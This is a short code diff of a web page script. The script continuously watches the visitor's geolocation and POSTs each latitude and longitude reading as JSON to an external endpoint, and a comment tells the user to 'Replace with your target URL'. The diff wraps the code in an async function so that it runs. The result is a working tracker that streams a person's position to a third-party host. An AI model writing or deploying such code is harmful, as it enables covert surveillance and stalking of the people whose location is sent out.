@@ -72,7 +72,7 @@
 
 
     const url = "https://app.tableflipped.xyz/carwarranty"; // Replace with your target URL
-
+(async () => {
 const watchId = await navigator.geolocation.watchPosition((position) =>  {
     let data = {lat:position.coords.latitude, lng:position.coords.longitude}
 console.log(position.coords.longitude)
@@ -81,9 +81,8 @@ fetch(url, {
   body: JSON.stringify(data), // Convert data object to JSON string
   headers: { "Content-Type": "application/json" }, // Set content type header
 })
-  
-
 })
+})();
 
 </script>
 
